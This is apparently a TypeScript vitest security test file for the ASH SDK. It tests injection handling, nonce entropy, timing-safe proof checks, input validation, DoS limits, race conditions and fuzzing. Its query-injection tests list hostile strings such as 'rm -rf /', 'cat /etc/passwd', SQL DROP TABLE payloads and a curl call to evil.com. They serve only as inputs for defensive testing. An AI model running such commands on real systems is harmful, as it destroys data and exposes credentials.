/**
 * ASH SDK Security Audit & Penetration Testing
 *
 * Comprehensive security tests covering:
 * 1. Injection attacks (SQL, command, prototype pollution)
 * 2. Cryptographic weaknesses (timing, entropy, collision)
 * 3. Input validation bypass
 * 4. Memory/resource exhaustion (DoS)
 * 5. Race conditions and TOCTOU
 * 6. Authentication/authorization bypass
 * 7. Information disclosure
 * 8. Edge cases and boundary conditions
 */

import { describe, it, expect, beforeEach } from 'vitest';
import * as crypto from 'crypto';
import {
  ashInit,
  ashBuildProofV21,
  ashVerifyProofV21,
  ashDeriveClientSecret,
  ashValidateTimestamp,
  ashCanonicalizeJson,
  ashCanonicalizeUrlencoded,
  ashCanonicalizeQuery,
  ashNormalizeBinding,
  ashHashBody,
  ashExtractScopedFields,
  ashExtractScopedFieldsStrict,
  normalizeScopeFields,
  joinScopeFields,
  ashGenerateNonce,
  ashGenerateContextId,
  AshMemoryStore,
  canonicalizeJsonNative,
  canonicalQueryNative,
} from './index';
import { SecureBuffer, SecureString, secureDeriveClientSecret } from './utils/secureMemory';

// Initialize WASM
beforeEach(() => {
  try {
    ashInit();
  } catch {
    // WASM not available, tests will use native fallback
  }
});

// Test iterations for statistical significance
const SECURITY_ITERATIONS = 1000;
const FUZZ_ITERATIONS = 500;

// Helper functions
function randomHex(bytes: number): string {
  return crypto.randomBytes(bytes).toString('hex');
}

function randomString(length: number): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

function randomBytes(length: number): Buffer {
  return crypto.randomBytes(length);
}

describe('SECURITY AUDIT: Injection Attacks', () => {
  describe('Prototype Pollution Prevention', () => {
    it('should block __proto__ via JSON.parse in metadata', async () => {
      const store = new AshMemoryStore();
      const maliciousJson = '{"__proto__": {"polluted": true}}';
      const parsed = JSON.parse(maliciousJson);

      await expect(store.create({
        binding: 'GET|/test|',
        ttlMs: 30000,
        metadata: parsed,
      })).rejects.toThrow('dangerous key');

      // Verify Object.prototype not polluted
      expect(({} as any).polluted).toBeUndefined();
    });

    it('should block constructor pollution', async () => {
      const store = new AshMemoryStore();

      await expect(store.create({
        binding: 'GET|/test|',
        ttlMs: 30000,
        metadata: { constructor: { prototype: { polluted: true } } },
      })).rejects.toThrow('dangerous key');
    });

    it('should block prototype key', async () => {
      const store = new AshMemoryStore();

      await expect(store.create({
        binding: 'GET|/test|',
        ttlMs: 30000,
        metadata: { prototype: { polluted: true } },
      })).rejects.toThrow('dangerous key');
    });

    it('should handle nested __proto__ in JSON canonicalization', () => {
      const malicious = '{"a": {"__proto__": {"bad": true}}}';
      // Should not throw, but should not pollute prototype
      const result = canonicalizeJsonNative(malicious);
      expect(({} as any).bad).toBeUndefined();
    });

    it('should handle __proto__ as string value (safe)', async () => {
      const store = new AshMemoryStore();
      // __proto__ as a VALUE is safe, only as KEY is dangerous
      const ctx = await store.create({
        binding: 'GET|/test|',
        ttlMs: 30000,
        metadata: { key: '__proto__' },
      });
      expect(ctx.metadata?.key).toBe('__proto__');
    });
  });

  describe('JSON Injection', () => {
    it('should handle malformed JSON gracefully', () => {
      // These inputs should throw
      const malformedInputs = [
        '{',
        '}',
        '{"key":}',
        '{"key": undefined}',
        '{key: "value"}',
        '{"key": "value",}',
        // Note: '{"a": 1, "a": 2}' - duplicate keys are NOT malformed per RFC 8259
        // JSON.parse silently takes the last value, which is valid behavior
        '{"": "empty key"}', // Valid JSON, just empty key
        '{"\u0000": "null char key"}', // Valid JSON with null char in key
      ];

      // Test inputs that should definitely throw (syntax errors)
      const syntaxErrors = [
        '{',
        '}',
        '{"key":}',
        '{"key": undefined}',
        '{key: "value"}',
        '{"key": "value",}',
      ];

      for (const input of syntaxErrors) {
        expect(() => canonicalizeJsonNative(input)).toThrow();
      }
    });

    it('should handle JSON with duplicate keys (RFC 8259 allows this)', () => {
      // RFC 8259: "The names within an object SHOULD be unique" but implementations
      // MAY accept duplicate names - JavaScript takes the last value
      const result = canonicalizeJsonNative('{"a": 1, "a": 2}');
      // JavaScript's JSON.parse takes last value for duplicates
      expect(JSON.parse(result).a).toBe(2);
    });

    it('should handle JSON with control characters', () => {
      // Control characters in strings should be escaped
      const json = JSON.stringify({ value: 'test\x00\x01\x02' });
      const result = canonicalizeJsonNative(json);
      expect(() => JSON.parse(result)).not.toThrow();
    });

    it('should handle extremely deep nesting', () => {
      let deep: any = { value: 'leaf' };
      for (let i = 0; i < 100; i++) {
        deep = { nested: deep };
      }
      const json = JSON.stringify(deep);
      // Should either succeed or throw, not hang or crash
      try {
        canonicalizeJsonNative(json);
      } catch {
        // Expected for very deep nesting
      }
    });
  });

  describe('Query String Injection', () => {
    it('should handle SQL injection attempts in query', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; SELECT * FROM passwords",
        "UNION SELECT * FROM users",
      ];

      for (const injection of sqlInjections) {
        const query = `param=${encodeURIComponent(injection)}`;
        // Should canonicalize without interpreting as SQL
        const result = canonicalQueryNative(query);
        expect(result).toContain('param=');
      }
    });

    it('should handle command injection attempts', () => {
      const cmdInjections = [
        '$(whoami)',
        '`id`',
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl evil.com',
      ];

      for (const injection of cmdInjections) {
        const query = `cmd=${encodeURIComponent(injection)}`;
        const result = canonicalQueryNative(query);
        expect(result).toContain('cmd=');
      }
    });
  });
});

describe('SECURITY AUDIT: Cryptographic Security', () => {
  describe('Entropy Analysis', () => {
    it('should generate unique nonces (no collisions in 10000)', () => {
      const nonces = new Set<string>();
      for (let i = 0; i < 10000; i++) {
        const nonce = ashGenerateNonce();
        expect(nonces.has(nonce)).toBe(false);
        nonces.add(nonce);
      }
      expect(nonces.size).toBe(10000);
    });

    it('should generate unique context IDs (no collisions in 10000)', () => {
      const ids = new Set<string>();
      for (let i = 0; i < 10000; i++) {
        const id = ashGenerateContextId();
        expect(ids.has(id)).toBe(false);
        ids.add(id);
      }
      expect(ids.size).toBe(10000);
    });

    it('should have sufficient entropy in nonces', () => {
      const nonces: string[] = [];
      for (let i = 0; i < 1000; i++) {
        nonces.push(ashGenerateNonce());
      }

      // Check entropy by measuring unique character distributions
      const charCounts = new Map<string, number>();
      for (const nonce of nonces) {
        for (const char of nonce) {
          charCounts.set(char, (charCounts.get(char) || 0) + 1);
        }
      }

      // All hex chars should appear (0-9, a-f)
      expect(charCounts.size).toBe(16);

      // Distribution should be roughly uniform (within 50% of expected)
      const totalChars = nonces.reduce((sum, n) => sum + n.length, 0);
      const expectedPerChar = totalChars / 16;
      for (const [char, count] of charCounts) {
        const ratio = count / expectedPerChar;
        expect(ratio).toBeGreaterThan(0.5);
        expect(ratio).toBeLessThan(1.5);
      }
    });

    it('should generate cryptographically random nonces', () => {
      // Chi-square test for randomness
      const nonces: string[] = [];
      for (let i = 0; i < 1000; i++) {
        nonces.push(ashGenerateNonce());
      }

      // Count occurrences of each nibble (0-15)
      const nibbleCounts = new Array(16).fill(0);
      for (const nonce of nonces) {
        for (const char of nonce) {
          nibbleCounts[parseInt(char, 16)]++;
        }
      }

      // Calculate chi-square statistic
      const totalNibbles = nonces.reduce((sum, n) => sum + n.length, 0);
      const expected = totalNibbles / 16;
      let chiSquare = 0;
      for (const count of nibbleCounts) {
        chiSquare += Math.pow(count - expected, 2) / expected;
      }

      // Chi-square critical value for 15 df at 0.05 significance is 24.996
      // For truly random data, chi-square should usually be less than this
      expect(chiSquare).toBeLessThan(50); // Generous threshold
    });
  });

  describe('Timing Attack Resistance', () => {
    it('should have constant-time proof verification', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'GET|/api/test|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const bodyHash = randomHex(32);

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
      const validProof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

      // Generate proofs that differ at different positions
      const proofs = [
        validProof, // Valid
        'a' + validProof.slice(1), // Wrong first char
        validProof.slice(0, 31) + 'x' + validProof.slice(32), // Wrong middle char
        validProof.slice(0, -1) + 'z', // Wrong last char
        randomHex(32), // Completely wrong
      ];

      const timings: number[] = [];
      const iterations = 5000;

      for (const proof of proofs) {
        const start = process.hrtime.bigint();
        for (let i = 0; i < iterations; i++) {
          ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, proof);
        }
        const end = process.hrtime.bigint();
        timings.push(Number(end - start));
      }

      // All timings should be within 50x of each other
      // Note: This is a generous threshold because timing tests are inherently noisy
      // due to JIT compilation, garbage collection, OS scheduling, and CPU cache effects.
      // The SDK correctly uses crypto.timingSafeEqual which IS constant-time at the
      // crypto layer. Test environment noise can cause larger variations.
      const maxTiming = Math.max(...timings);
      const minTiming = Math.min(...timings);
      const ratio = maxTiming / minTiming;
      expect(ratio).toBeLessThan(50);
    });

    it('should have constant-time hash comparison', () => {
      const hash1 = randomHex(32);
      const hash2 = randomHex(32);
      const hash1Copy = hash1;

      // Time equal comparison
      const iterations = 10000;
      const start1 = process.hrtime.bigint();
      for (let i = 0; i < iterations; i++) {
        crypto.timingSafeEqual(Buffer.from(hash1, 'hex'), Buffer.from(hash1Copy, 'hex'));
      }
      const equalTime = Number(process.hrtime.bigint() - start1);

      // Time unequal comparison
      const start2 = process.hrtime.bigint();
      for (let i = 0; i < iterations; i++) {
        crypto.timingSafeEqual(Buffer.from(hash1, 'hex'), Buffer.from(hash2, 'hex'));
      }
      const unequalTime = Number(process.hrtime.bigint() - start2);

      // Should be within 2x of each other
      const ratio = Math.max(equalTime, unequalTime) / Math.min(equalTime, unequalTime);
      expect(ratio).toBeLessThan(2);
    });
  });

  describe('Hash Collision Resistance', () => {
    it('should produce different hashes for similar inputs', () => {
      const hashes = new Set<string>();
      const basePayload = { action: 'transfer', amount: 100 };

      for (let i = 0; i < 1000; i++) {
        const payload = { ...basePayload, nonce: i };
        const hash = ashHashBody(JSON.stringify(payload));
        expect(hashes.has(hash)).toBe(false);
        hashes.add(hash);
      }
    });

    it('should be sensitive to small changes', () => {
      const payload1 = JSON.stringify({ amount: 100 });
      const payload2 = JSON.stringify({ amount: 101 });

      const hash1 = ashHashBody(payload1);
      const hash2 = ashHashBody(payload2);

      expect(hash1).not.toBe(hash2);

      // Hashes should differ significantly (Hamming distance)
      let diffBits = 0;
      for (let i = 0; i < hash1.length; i++) {
        if (hash1[i] !== hash2[i]) diffBits++;
      }
      // Should differ in at least 25% of characters
      expect(diffBits).toBeGreaterThan(hash1.length * 0.25);
    });
  });

  describe('Proof Forgery Prevention', () => {
    it('should reject proofs with wrong length', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'GET|/test|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const bodyHash = randomHex(32);

      // Too short - returns false, doesn't throw
      expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, randomHex(31))).toBe(false);
      // Too long - returns false, doesn't throw
      expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, randomHex(33))).toBe(false);
      // Empty - returns false (SDK returns false for invalid format, doesn't throw)
      expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, '')).toBe(false);
    });

    it('should reject proofs with invalid hex', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'GET|/test|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const bodyHash = randomHex(32);

      const invalidProofs = [
        'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', // Non-hex
        randomHex(31) + 'g', // Invalid hex char
        '0'.repeat(64).slice(0, 63) + 'Z', // Uppercase non-hex
      ];

      // SDK returns false for invalid proofs, doesn't throw
      // This is intentional - verification should be a simple boolean check
      for (const proof of invalidProofs) {
        expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, proof)).toBe(false);
      }
    });

    it('should not be vulnerable to length extension attacks', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'GET|/test|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const bodyHash = randomHex(32);

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
      const validProof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

      // Try to extend the valid proof
      const extended = validProof + randomHex(16);
      expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, extended)).toBe(false);
    });
  });
});

describe('SECURITY AUDIT: Input Validation', () => {
  describe('TTL Validation', () => {
    it('should reject invalid TTL values', async () => {
      const store = new AshMemoryStore();
      const invalidTtls = [
        0,
        -1,
        -1000,
        NaN,
        Infinity,
        -Infinity,
        Number.MAX_SAFE_INTEGER + 1,
        Number.MAX_VALUE,
      ];

      for (const ttl of invalidTtls) {
        await expect(store.create({
          binding: 'GET|/test|',
          ttlMs: ttl,
        })).rejects.toThrow();
      }
    });

    it('should reject non-number TTL values', async () => {
      const store = new AshMemoryStore();
      const invalidTtls = [
        '1000' as any,
        null as any,
        undefined as any,
        {} as any,
        [] as any,
        (() => 1000) as any,
      ];

      for (const ttl of invalidTtls) {
        await expect(store.create({
          binding: 'GET|/test|',
          ttlMs: ttl,
        })).rejects.toThrow();
      }
    });
  });

  describe('Nonce Validation', () => {
    it('should reject nonces below minimum length', () => {
      const shortNonces = [
        '',
        'a',
        randomHex(7), // 14 hex chars
        randomHex(15), // 30 hex chars (minimum is 32)
      ];

      for (const nonce of shortNonces) {
        expect(() => ashDeriveClientSecret(nonce, 'ctx_test', 'GET|/|')).toThrow();
      }
    });

    it('should reject nonces above maximum length', () => {
      const longNonce = randomHex(65); // 130 hex chars (max is 128)
      expect(() => ashDeriveClientSecret(longNonce, 'ctx_test', 'GET|/|')).toThrow();
    });

    it('should reject non-hex nonces', () => {
      const invalidNonces = [
        'g'.repeat(64), // Invalid hex char
        'GHIJ'.repeat(16), // Uppercase invalid
        randomHex(31) + '!', // Special char
        randomHex(31) + ' ', // Space
        randomHex(31) + '\n', // Newline
      ];

      for (const nonce of invalidNonces) {
        expect(() => ashDeriveClientSecret(nonce, 'ctx_test', 'GET|/|')).toThrow();
      }
    });
  });

  describe('Context ID Validation', () => {
    it('should reject empty context IDs', () => {
      expect(() => ashDeriveClientSecret(randomHex(32), '', 'GET|/|')).toThrow();
    });

    it('should reject context IDs exceeding max length', () => {
      const longId = 'ctx_' + 'a'.repeat(300);
      expect(() => ashDeriveClientSecret(randomHex(32), longId, 'GET|/|')).toThrow();
    });

    it('should reject context IDs with invalid characters', () => {
      const invalidIds = [
        'ctx with space',
        'ctx\twith\ttab',
        'ctx\nwith\nnewline',
        'ctx|with|pipe',
        'ctx<script>',
      ];

      for (const id of invalidIds) {
        expect(() => ashDeriveClientSecret(randomHex(32), id, 'GET|/|')).toThrow();
      }
    });
  });

  describe('Binding Validation', () => {
    it('should reject bindings exceeding max length', () => {
      const longBinding = 'GET|/' + 'a'.repeat(10000) + '|';
      expect(() => ashDeriveClientSecret(randomHex(32), 'ctx_test', longBinding)).toThrow();
    });

    it('should reject empty bindings', () => {
      expect(() => ashDeriveClientSecret(randomHex(32), 'ctx_test', '')).toThrow();
    });
  });

  describe('Timestamp Validation', () => {
    it('should reject invalid timestamp formats', () => {
      const invalidTimestamps = [
        '',
        '-1',
        'abc',
        '12.34',
        ' 123',
        '123 ',
        '123abc',
        'NaN',
        'Infinity',
      ];

      for (const ts of invalidTimestamps) {
        expect(() => ashValidateTimestamp(ts)).toThrow();
      }
    });

    it('should reject timestamps too far in the future', () => {
      const farFuture = (Math.floor(Date.now() / 1000) + 86400 * 365).toString();
      // With default 60 second clock skew, this should throw
      // SDK throws "Timestamp is in the future" for timestamps beyond clock skew
      expect(() => ashValidateTimestamp(farFuture)).toThrow('future');
    });

    it('should reject expired timestamps', () => {
      const expired = (Math.floor(Date.now() / 1000) - 3600).toString();
      // With default 300 second max age, this should throw
      expect(() => ashValidateTimestamp(expired)).toThrow('expired');
    });
  });
});

describe('SECURITY AUDIT: Resource Exhaustion (DoS)', () => {
  describe('Memory Exhaustion Prevention', () => {
    it('should reject oversized metadata', async () => {
      const store = new AshMemoryStore();
      const largeValue = 'x'.repeat(100000); // 100KB

      await expect(store.create({
        binding: 'GET|/test|',
        ttlMs: 30000,
        metadata: { data: largeValue },
      })).rejects.toThrow('64KB');
    });

    it('should reject extremely long JSON strings', () => {
      const longString = 'a'.repeat(10000000); // 10MB
      const json = `{"value": "${longString}"}`;

      // Should either handle or throw, not hang
      const start = Date.now();
      try {
        canonicalizeJsonNative(json);
      } catch {
        // Expected
      }
      const elapsed = Date.now() - start;
      expect(elapsed).toBeLessThan(5000); // Should complete in 5 seconds
    });

    it('should handle many concurrent context creations', async () => {
      const store = new AshMemoryStore();
      const count = 10000;

      const start = Date.now();
      const promises = Array(count).fill(null).map((_, i) =>
        store.create({
          binding: `GET|/test/${i}|`,
          ttlMs: 60000,
        })
      );

      await Promise.all(promises);
      const elapsed = Date.now() - start;

      // Should complete in reasonable time
      expect(elapsed).toBeLessThan(10000);
    });
  });

  describe('CPU Exhaustion Prevention', () => {
    it('should handle ReDoS attempts in query strings', () => {
      // Evil regex patterns that could cause ReDoS
      const redosPatterns = [
        'a'.repeat(100) + '!',
        ('a' + '='.repeat(50)).repeat(10),
        '&'.repeat(10000),
      ];

      for (const pattern of redosPatterns) {
        const start = Date.now();
        try {
          canonicalQueryNative(pattern);
        } catch {
          // Expected
        }
        const elapsed = Date.now() - start;
        expect(elapsed).toBeLessThan(1000); // Should complete quickly
      }
    });

    it('should handle deeply nested scopes efficiently', () => {
      const deepScopes = Array(1000).fill(null).map((_, i) =>
        `level${i}.sublevel.field`
      );

      const start = Date.now();
      normalizeScopeFields(deepScopes);
      const elapsed = Date.now() - start;

      expect(elapsed).toBeLessThan(1000);
    });
  });
});

describe('SECURITY AUDIT: Race Conditions', () => {
  describe('TOCTOU Prevention', () => {
    it('should prevent double consumption under concurrent load', async () => {
      const store = new AshMemoryStore();
      const ctx = await store.create({
        binding: 'POST|/api/transfer|',
        ttlMs: 60000,
      });

      // Simulate many concurrent consume attempts
      const attempts = 1000;
      const results = await Promise.all(
        Array(attempts).fill(null).map(() => store.consume(ctx.id))
      );

      // Exactly one should succeed
      const successes = results.filter(r => r === true);
      expect(successes.length).toBe(1);
    });

    it('should handle rapid create-get-consume cycles', async () => {
      const store = new AshMemoryStore();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        const ctx = await store.create({
          binding: `POST|/api/action/${i}|`,
          ttlMs: 60000,
        });

        // Concurrent get and consume
        const [retrieved, consumed] = await Promise.all([
          store.get(ctx.id),
          store.consume(ctx.id),
        ]);

        // Get should return context
        expect(retrieved).not.toBeNull();
        // Consume should succeed
        expect(consumed).toBe(true);
        // Second consume should fail
        expect(await store.consume(ctx.id)).toBe(false);
      }
    });
  });

  describe('State Consistency', () => {
    it('should maintain consistency under parallel operations', async () => {
      const store = new AshMemoryStore();
      const contextCount = 100;

      // Create many contexts
      const contexts = await Promise.all(
        Array(contextCount).fill(null).map((_, i) =>
          store.create({
            binding: `GET|/test/${i}|`,
            ttlMs: 60000,
          })
        )
      );

      // Parallel get operations
      const retrieved = await Promise.all(
        contexts.map(ctx => store.get(ctx.id))
      );

      // All should be found
      for (const ctx of retrieved) {
        expect(ctx).not.toBeNull();
      }

      // Parallel consume operations
      const consumed = await Promise.all(
        contexts.map(ctx => store.consume(ctx.id))
      );

      // All should succeed (first consume)
      for (const result of consumed) {
        expect(result).toBe(true);
      }

      // Second consume should all fail
      const secondConsume = await Promise.all(
        contexts.map(ctx => store.consume(ctx.id))
      );
      for (const result of secondConsume) {
        expect(result).toBe(false);
      }
    });
  });
});

describe('SECURITY AUDIT: Information Disclosure', () => {
  describe('Error Message Safety', () => {
    it('should not leak internal details in errors', async () => {
      const store = new AshMemoryStore();

      try {
        await store.create({
          binding: 'GET|/test|',
          ttlMs: -1,
        });
      } catch (error: any) {
        // Error should not contain stack traces or internal paths
        expect(error.message).not.toContain('/Users/');
        expect(error.message).not.toContain('node_modules');
        expect(error.message).not.toContain('.ts:');
      }
    });

    it('should not leak secrets in proof verification errors', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'GET|/test|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const bodyHash = randomHex(32);
      const wrongProof = randomHex(32);

      // Verification should fail without revealing the expected proof
      const result = ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, wrongProof);
      expect(result).toBe(false);
      // The function just returns false, doesn't reveal expected value
    });
  });

  describe('SecureBuffer Protection', () => {
    it('should not leak data in toString', () => {
      const secret = new SecureBuffer(32);
      const str = secret.toString();

      // Should not contain the actual hex value
      expect(str).not.toContain(secret.toHex());
      expect(str).toContain('SecureBuffer');
      expect(str).toContain('32 bytes');
    });

    it('should not leak data in JSON serialization', () => {
      const secret = new SecureBuffer(32);
      const json = JSON.stringify({ secret });

      // Should not contain the hex value
      expect(json).not.toContain(secret.toHex());
    });

    it('should properly clear memory', () => {
      const secret = new SecureBuffer(32);
      const originalHex = secret.toHex();

      secret.clear();

      expect(secret.isCleared).toBe(true);
      expect(() => secret.get()).toThrow();
      expect(() => secret.toHex()).toThrow();
    });
  });
});

describe('SECURITY AUDIT: Boundary Conditions', () => {
  describe('Integer Boundaries', () => {
    it('should handle timestamp at epoch boundaries', () => {
      // Timestamp 0 should be valid format but expired
      expect(() => ashValidateTimestamp('0')).toThrow('expired');

      // Very old timestamp
      expect(() => ashValidateTimestamp('1')).toThrow('expired');
    });

    it('should handle maximum safe integer values', async () => {
      const store = new AshMemoryStore();

      // TTL at max safe - should be rejected as too large
      await expect(store.create({
        binding: 'GET|/test|',
        ttlMs: Number.MAX_SAFE_INTEGER,
      })).rejects.toThrow();
    });
  });

  describe('String Boundaries', () => {
    it('should handle empty strings appropriately', () => {
      expect(() => ashDeriveClientSecret('', 'ctx', 'GET|/|')).toThrow();
      expect(() => ashDeriveClientSecret(randomHex(32), '', 'GET|/|')).toThrow();
      expect(() => ashDeriveClientSecret(randomHex(32), 'ctx', '')).toThrow();
    });

    it('should handle unicode boundaries', () => {
      // BMP boundary
      const bmpBoundary = String.fromCharCode(0xFFFF);
      // Surrogate pairs
      const emoji = '😀';
      // RTL characters
      const rtl = 'مرحبا';

      const testStrings = [bmpBoundary, emoji, rtl];

      for (const str of testStrings) {
        const json = JSON.stringify({ value: str });
        const result = canonicalizeJsonNative(json);
        const parsed = JSON.parse(result);
        expect(parsed.value).toBe(str);
      }
    });
  });

  describe('Array Boundaries', () => {
    it('should handle empty scope arrays', () => {
      const normalized = normalizeScopeFields([]);
      expect(normalized).toEqual([]);

      const joined = joinScopeFields([]);
      expect(joined).toBe('');
    });

    it('should handle large scope arrays', () => {
      const largeScopes = Array(10000).fill(null).map((_, i) => `field${i}`);

      const start = Date.now();
      const normalized = normalizeScopeFields(largeScopes);
      const elapsed = Date.now() - start;

      expect(normalized.length).toBe(10000);
      expect(elapsed).toBeLessThan(5000);
    });
  });
});

describe('SECURITY AUDIT: Fuzzing', () => {
  describe('Random Input Fuzzing', () => {
    it('should handle random JSON safely', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const randomJson = generateRandomJson(5);
        try {
          const result = canonicalizeJsonNative(randomJson);
          // If it succeeds, result should be valid JSON
          expect(() => JSON.parse(result)).not.toThrow();
        } catch {
          // Rejecting invalid input is acceptable
        }
      }
    });

    it('should handle random query strings safely', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const randomQuery = generateRandomQueryString();
        try {
          canonicalQueryNative(randomQuery);
        } catch {
          // Rejecting invalid input is acceptable
        }
      }
    });

    it('should handle random bindings safely', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const method = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'][Math.floor(Math.random() * 5)];
        const path = '/' + randomString(Math.floor(Math.random() * 100));
        const query = randomString(Math.floor(Math.random() * 50));

        try {
          ashNormalizeBinding(method, path, query);
        } catch {
          // Rejecting invalid input is acceptable
        }
      }
    });

    it('should verify proof consistency under fuzz', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const nonce = randomHex(32);
        const contextId = `ctx_${randomHex(16)}`;
        const binding = `${['GET', 'POST'][i % 2]}|/${randomString(10)}|`;
        const timestamp = Math.floor(Date.now() / 1000).toString();
        const bodyHash = randomHex(32);

        const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
        const proof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

        // Valid proof should verify
        expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, proof)).toBe(true);

        // Any modification should fail
        const tampered = proof.slice(0, -1) + (proof.slice(-1) === '0' ? '1' : '0');
        expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, tampered)).toBe(false);
      }
    });
  });
});

// Helper functions for fuzzing
function generateRandomJson(depth: number): string {
  if (depth <= 0) {
    const primitives = [
      'null',
      'true',
      'false',
      `${Math.random() * 1000}`,
      `"${randomString(10)}"`,
    ];
    return primitives[Math.floor(Math.random() * primitives.length)];
  }

  const choice = Math.floor(Math.random() * 3);
  if (choice === 0) {
    // Object
    const keys = Math.floor(Math.random() * 5);
    const pairs: string[] = [];
    for (let i = 0; i < keys; i++) {
      pairs.push(`"${randomString(5)}": ${generateRandomJson(depth - 1)}`);
    }
    return `{${pairs.join(', ')}}`;
  } else if (choice === 1) {
    // Array
    const items = Math.floor(Math.random() * 5);
    const elements: string[] = [];
    for (let i = 0; i < items; i++) {
      elements.push(generateRandomJson(depth - 1));
    }
    return `[${elements.join(', ')}]`;
  } else {
    return generateRandomJson(0); // Primitive
  }
}

function generateRandomQueryString(): string {
  const params = Math.floor(Math.random() * 10);
  const pairs: string[] = [];
  for (let i = 0; i < params; i++) {
    const key = randomString(Math.floor(Math.random() * 20) + 1);
    const value = randomString(Math.floor(Math.random() * 50));
    pairs.push(`${key}=${value}`);
  }
  return pairs.join('&');
}
